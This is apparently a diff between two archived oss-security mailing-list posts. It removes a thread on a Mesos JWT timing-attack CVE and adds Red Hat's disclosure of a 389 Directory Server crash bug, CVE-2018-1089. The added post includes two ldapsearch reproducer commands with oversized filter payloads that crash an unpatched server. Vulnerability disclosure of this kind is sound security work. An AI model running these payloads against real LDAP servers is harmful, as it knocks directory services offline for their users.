@@ -1,66 +1,67 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/25/5
-Message-ID: <CAE-_4r3t0=fss0PSo9cSOVW3s4mXbJMnz5-WpY4MJifFFeDwgg@mail.gmail.com>
-Date: Tue, 25 Sep 2018 20:24:42 +0300
-From: Ariel Zelivansky <ariel.zelivans@...il.com>
-To: Terry Chia <terrycwk1994@...il.com>
-Cc: oss-security@...ts.openwall.com, Alex R <alexr@...che.org>
-Subject: Re: CVE-2018-8023: A remote attacker can exploit a vulnerability in the JWT implementation to gain unauthenticated access to Mesos Executor HTTP API.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/07/3
+Message-ID: <CAKG8Do6CyL4JQxhvXSx5a31KAZEP7PpEy29cyFp+bTeRm5=wzQ@mail.gmail.com>
+Date: Mon, 7 May 2018 17:35:30 +0200
+From: Cedric Buissart <cbuissar@...hat.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch
 Content-Type: text/plain; charset=utf-8
 
-Thanks for following up with this
+On Mon, May 7, 2018 at 5:30 PM, Cedric Buissart <cbuissar@...hat.com> wrote:
 
-On Mon, Sep 24, 2018 at 4:36 AM, Terry Chia <terrycwk1994@...il.com> wrote:
-> Hi Ariel,
+> Hi all,
 >
-> I believe the following commit contains the fix:
-> https://github.com/apache/mesos/commit/2c282f19755ea7518caf6f43e729524b1c6bdb23
+> This is to disclose the following flaw, CVE-2018-1089 :
 >
-> Cheers,
-> Terry
+> 389-ds-base, a.k.a 389 Directory Server, https://pagure.io/389-ds-base/,
+> is a highly usable, fully featured, reliable and secure LDAP server
+> implementation. It handles many of the largest LDAP deployments in the
+> world.
+>
+> 389-ds server did not properly handle characters needed to be escaped in
+> its query filter. This could result in buffer overflows, from the heap
+> or the stack, on larger filters.  An unauthenticated attacker could send
+> a specially crafted LDAP request and crash the server. RCE has not been
+> demonstrated at this time.
+>
+> Red Hat would like to thank Greg Kubok for alerting us of the issue.
 >
 >
-> On Sun, Sep 23, 2018 at 12:46 AM Ariel Zelivansky <ariel.zelivans@...il.com>
-> wrote:
->>
->> Hi,
->>
->> I couldn't find the fix for this in the mesos repository and it is not
->> documented in the CHANGELOG, could someone direct me to the fixing
->> commit/patch?
->>
->> Thanks
->> Ariel
->>
->> On Fri, Sep 21, 2018 at 1:50 PM, Alex R <alexr@...che.org> wrote:
->> >
->> > Severity: Important
->> >
->> > Vendor:
->> > The Apache Software Foundation
->> >
->> > Versions Affected:
->> > Apache Mesos 1.4.0 to 1.6.0
->> > The unsupported Apache Mesos pre-1.4.0 releases may be also affected.
->> >
->> > Description:
->> > Apache Mesos can be configured to require authentication to call the
->> > Executor HTTP API using JSON Web Token (JWT). The comparison of the
->> > generated HMAC value against the provided signature in the JWT
->> > implementation used is vulnerable to a timing attack because instead
->> > of a constant-time string comparison routine a standard `==` operator
->> > has been used. A malicious actor can therefore abuse the timing
->> > difference of when the JWT validation function returns to reveal the
->> > correct HMAC value.
->> >
->> > Mitigation:
->> > pre-1.4.x users should upgrade to at least 1.4.2
->> > 1.4.x users should upgrade to 1.4.2
->> > 1.5.x users should upgrade to 1.5.2
->> > 1.6.0 users should upgrade to 1.6.1
->> > 1.7.0-dev users should obtain Mesos 1.7.0
->> >
->> > Credit:
->> > This issue was discovered by Terry Chia (Ayrx).
->> >
->> > Alex on behalf of Mesos PMC
+> Reproducer1 :
+> [root@...ver1 ~]# payload=$(printf '.*$%.0s' {1..1000})
+> [root@...ver1 ~]# ldapsearch -h localhost -p 389 -x -b "dc=blah"
+> "(&(|(telephoneNumber=*${payload}*)(uid=*${payload}*)(
+> title=*${payload}*)(sn=*${payload}*)(ou=*${payload}*)(
+> givenName=*${payload}*))(objectClass=posixaccount))"
+> "telephoneNumber sshpubkeyfp ipaSshPubKey uid krbCanonicalName title
+> loginShell uidNumber gidNumber sn homeDirectory mail krbPrincipalName
+> givenName nsAccountLock"
+>
+> Reproducer2:
+> [root@...ver1 ~]# perl -e 'print ".*\$" x (1400)' | ldapsearch -x -f-
+> "(&(uid=%s)(objectClass=posixaccount))"
+>
+>
+> Patch attached for versions 1.3.7 & 1.2.11
+>
+Patches are now attached for real.
+
+>
+> Thanks!
+>
+> --
+> Cedric Buissart,
+> Product Security
+>
+
+
+
+-- 
+Cedric Buissart,
+Product Security
+
+Content of type "text/html" skipped
+
+View attachment "v1.3.7.5-CVE-2018-1089-Crash-from-long-search-filter.patch" of type "text/x-patch" (3369 bytes)
+
+View attachment "v1.2.11.15-CVE-2018-1089-crash-in-long-search-filter.patch" of type "text/x-patch" (1549 bytes)
